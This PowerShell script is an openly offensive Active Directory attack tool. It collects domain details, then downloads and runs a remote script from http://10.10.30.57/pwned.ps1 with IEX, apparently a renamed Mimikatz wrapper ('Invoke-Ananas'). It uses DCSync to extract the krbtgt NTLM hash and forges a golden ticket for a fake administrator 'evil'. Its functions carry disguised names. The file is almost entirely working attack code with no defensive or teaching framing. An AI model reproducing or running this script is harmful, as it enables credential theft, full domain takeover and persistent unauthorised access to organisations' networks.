function Get-DomainInfos{
    <#
    .SYNOPSIS
        Get domain informations
    .DESCRIPTION
        Informations : SID, Domain Name
        Return an array of powershell objects:
        [0] Domain name
        [1] Domain SID
        [2] Account type
    #>
    
    $user = whoami
    $DomainName = (Get-WmiObject win32_computersystem).Domain 
    $userinfos = Get-WmiObject win32_useraccount | Where-Object {$_.Caption -eq $user}
    $DomainSID = $userinfos.SID.Remove(41)
    $array = $DomainName, $DomainSID, $userinfos.AccountType
    return $array
}
    
function Get-Bowser{
    <#
    .SYNOPSIS
        The hash is the output
    .DESCRIPTION
        Return krbtgt hash
    
    .PARAMETER DomainName
        Domain Name
    #>
    param(
        [parameter(
            Position=0,
            Mandatory=$true,
            HelpMessage="The name of the domain"
        )]
        [ValidateNotNullOrEmpty()]
        [string]$DomainName
    )
    $command = '"lsadump::dcsync /domain:'+$DomainName+' /user:krbtgt"'
    $i = 0
    $infos = Invoke-Ananas -Command $command
    Write-Host '[+]'$command -ForegroundColor Green
    $obj = $infos.split(":")
    for($i=0;$i -lt $obj.Length;$i++){
        if($obj[$i] -match "Hash NTLM"){
            $hash = $obj[$i+1]
        }
    }
    $hash = $hash.split(" ")[1]
    $hash = $hash.Remove(32)
    return $hash
}

function Create-Golden{
    <#
    .SYNOPSIS
        Create golden ticket and check it in the directory
    .DESCRIPTION 
        Return a ticket to carry out a Pass The Ticket attack
    #>
    param(
        [parameter(
            Position=0,
            Mandatory=$true,
            HelpMessage="The name of the domain"
        )]
        [ValidateNotNullOrEmpty()]
        [string]$DomainName,
        
        [parameter(
            Position=0,
            Mandatory=$true,
            HelpMessage="The name of the domain"
        )]
        [ValidateNotNullOrEmpty()]
        [string]$sid,

        [parameter(
            Position=0,
            Mandatory=$true,
            HelpMessage="The name of the domain"
        )]
        [ValidateNotNullOrEmpty()]
        [string]$rc4
    )
    $command = '"kerberos::golden /domain:'+$DomainName+' /sid:'+$sid+' /rc4:'+$rc4+' /id:500 /user:evil"'
    $infos = Invoke-Ananas -Command $command
    Write-Host '[+] '$command -ForegroundColor Green
    if(Test-Path ticket.kirbi) {
        return 'OK'
    }
    else {
        return '[-] No ticket has been created'
    }
}

$DomainInfos = Get-DomainInfos
if($DomainInfos[2] -eq 512) {
    Write-Host '[+] '$DomainInfos -ForegroundColor Green
    IEX([Net.Webclient]::new().DownloadString("http://10.10.30.57/pwned.ps1")) 
    $hash = Get-Bowser -DomainName $DomainInfos[0] 
    $Status = Create-Golden -DomainName $DomainInfos[0] -sid $DomainInfos[1] -rc4 $hash
    Write-Host $Status
}
